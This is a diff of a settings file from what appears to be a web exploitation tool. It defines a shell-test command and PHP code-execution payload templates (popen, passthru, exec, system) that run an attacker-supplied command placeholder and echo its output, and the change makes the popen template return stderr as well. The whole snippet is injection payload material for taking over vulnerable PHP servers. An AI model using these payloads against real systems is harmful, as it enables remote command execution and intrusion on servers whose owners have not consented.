@@ -142,7 +142,7 @@ settings["shell_test"] = ("echo $((77*77))", "5929")
 # In best case it should echo all stuff back to us.
 # __PAYLOAD__ will be replaces by the actual command.
 settings["php_exec"]=[]
-settings["php_exec"].append(("popen","<? $h=popen(\"__PAYLOAD__\", \"r\");while(!feof($h)){$l=fread($h, 2024);echo $l;}?>"))
+settings["php_exec"].append(("popen","<? $h=popen(\"__PAYLOAD__ 2>&1\", \"r\");while(!feof($h)){$l=fread($h, 2024);echo $l;}?>"))
 settings["php_exec"].append(("passthru", "<? passthru (\"__PAYLOAD__\"); ?>"))
 settings["php_exec"].append(("exec", "<? exec (\"__PAYLOAD__\"); ?>"))
 settings["php_exec"].append(("system", "<? system (\"__PAYLOAD__\"); ?>"))
